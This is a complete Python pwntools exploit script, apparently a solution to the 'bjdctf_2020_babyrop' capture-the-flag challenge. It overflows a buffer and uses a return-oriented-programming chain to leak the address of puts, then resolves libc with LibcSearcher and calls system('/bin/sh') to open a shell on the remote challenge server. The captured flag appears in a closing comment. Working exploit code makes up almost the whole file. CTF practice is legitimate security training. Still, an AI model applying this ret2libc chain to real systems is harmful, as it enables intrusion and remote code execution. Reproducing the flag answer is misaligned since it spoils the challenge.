#!/usr/bin/env python3

from pwn import *
from LibcSearcher import *

HOST = "node4.buuoj.cn"
PORT = 28382

context.binary = elf = ELF('./bjdctf_2020_babyrop', checksec = False)
# libc = ELF('./libc6_2.23-0ubuntu11_amd64.so', checksec = False)

# p = process(elf.path)
p = remote(HOST, PORT)

# 0x0000000000400733 : pop rdi ; ret
pop_rdi = 0x400733
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.symbols['main']

payload = b'x' * 40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

p.sendafter(b'Pull up your sword and tell me u story!\n', payload)
puts_leaked = u64(p.recv(6).ljust(8, b'\x00'))
print(hex(puts_leaked))

log.info("puts leaked = " + hex(puts_leaked))

libc = LibcSearcher('puts', puts_leaked)
offset = puts_leaked - libc.dump('puts')
system = offset + libc.dump('system')
binsh = offset + libc.dump('str_bin_sh')

payload2 = b'x' * 40 + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendafter(b'Pull up your sword and tell me u story!\n', payload2)

p.interactive()

# flag{d0ac7328-9568-4473-967b-b94f424b48e3}